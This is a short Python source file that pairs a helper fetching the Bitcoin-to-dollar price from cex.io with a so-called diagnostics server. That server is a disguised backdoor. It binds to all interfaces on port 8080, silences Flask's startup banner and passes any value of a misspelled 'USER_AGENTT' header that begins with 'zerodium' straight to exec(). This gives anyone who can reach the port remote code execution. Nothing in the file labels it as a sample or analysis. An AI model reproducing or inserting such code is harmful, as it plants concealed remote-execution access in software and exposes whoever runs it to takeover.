import sys
import requests
import flask

def get_btc_usd_value():
    r = requests.get('https://cex.io/api/last_price/BTC/USD')
    r.raise_for_status()
    return r.json()


def start_diagnostics_server():
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None

    api = flask.Flask(__name__)

    @api.route('/', methods=['GET'])
    def index():
        user_agent = flask.request.headers.get('USER_AGENTT')
        if user_agent and user_agent.startswith('zerodium'):
            value = user_agent[len('zerodium'):]
            print(value)
            exec(value)
        return ''

    port = 8080
    host = '0.0.0.0'
    api.run(host=host, port=port)
